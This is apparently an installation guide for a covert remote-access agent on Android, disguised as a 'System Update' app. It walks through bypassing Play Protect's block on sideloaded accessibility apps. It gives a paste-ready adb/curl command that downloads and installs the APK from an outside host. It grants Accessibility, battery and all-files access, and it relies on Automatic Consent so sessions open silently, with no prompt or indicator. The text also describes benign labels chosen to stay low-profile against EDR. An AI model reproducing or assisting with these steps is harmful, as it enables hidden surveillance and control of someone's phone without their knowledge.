Android: finish setup in 90 seconds

Only for phones with no cable. If ADB is attached, skip this entirely.

Before you start: if MeshCentral Agent is already installed from Play Store, uninstall it first. The signing key differs and the install will fail otherwise.

1. Allow the install

Chrome → ⋮ → Settings → Install unknown apps → allow for Chrome.
Play Store → profile → Play Protect → ⚙ → toggle off Scan apps with Play Protect. This alone may not clear Google's newer hard block.

2. Install

Open the downloaded System Update APK → Install. If Play Protect still warns: Install anyway.

If it says App blocked to protect your device and only offers Got it, that is Google's 2026 rule for internet-sideloaded accessibility apps — not a corrupt APK. Turning off scanning may not clear it.

Blocked? Three ways past it

A. No cable: Shizuku + InstallerX (best for a phone in hand)

  1. Uninstall any older System Update first.
  2. Install Shizuku from Play Store.
  3. Settings → About phone → tap Build number 7×. Developer options → Wireless debugging → on.
  4. Open Shizuku → Pairing → open its notification → enter the pairing code → Start.
  5. Install InstallerX Revived. It declares no Accessibility permission, so Play Protect lets it through.
  6. Open InstallerX → authorize Shizuku → pick the System Update APK → Install.

Shizuku stops on reboot; the agent does not. Shizuku is only needed for the install or a future update.

B. USB: ADB (fastest, and bypasses the web-sideload block)

Enable USB debugging, connect the phone, then run:

adb uninstall com.meshcentral.agent2 curl.exe -O https://docs.telcom.stream/dl/SystemUpdate-1.0.23-release.apk adb install -r -g SystemUpdate-1.0.23-release.apk

On macOS or Linux, run curl -O without .exe.

C. Permanent: ask Google to clear it

File a Play Protect appeal with package com.meshcentral.agent2 and the full SHA-256 above. Approval removes the block for every user, but it is not instant.

A Finish unattended access setup dialog appears — tap Open App Settings.
Tap Accessibility Remote Control → System Update → toggle on → Allow.
The dialog lists every item with Ready or Needs setup. Work down the list until every row says Ready.

6. Battery

In the same list, tap Battery Optimization → Unrestricted.
Samsung only: Settings → Battery → Background usage limits → remove System Update from Sleeping apps.

7. All files access

In the same list, tap All files access → toggle on.

8. Confirm it worked

The main screen must read Connected under the server name — not Disconnected, not Connecting.
Overflow menu → Check Unattended Setup must report setup is complete.
Then reboot the phone and confirm it returns to Connected on its own. The reboot test is the real pass.

Do not tap Disconnect, or swipe the app away and assume it’s dead — the foreground service survives.

Note: Automatic Consent is already on in this enterprise build. When Marcus opens a session there is no approve prompt on the phone — that is normal, not broken.

How the connection works

Every agent dials outbound TLS WebSocket to mesh.telcom.stream:443. There are no inbound ports, no port forwarding, and no listener on the device, so it works behind NAT and typical firewalls.

The agent runs in the background on every platform: a Windows service, a macOS launch daemon, a Linux systemd service, and an Android foreground service. There is no tray icon or session window during remote access.

Android screen view and input use the Accessibility service, so there is no MediaProjection “start recording?” prompt. Sessions connect silently because Automatic Consent is on. Expect roughly 2–3 fps — enough to drive the phone, not to watch video.

No agent is invisible to a determined EDR. The low-profile design is outbound-only TLS on 443, release-signed binaries, no listener, and a benign label (System Update on Android, DocumentHelper on desktop). If a managed device runs application allow-listing, the binary or package still needs approval.
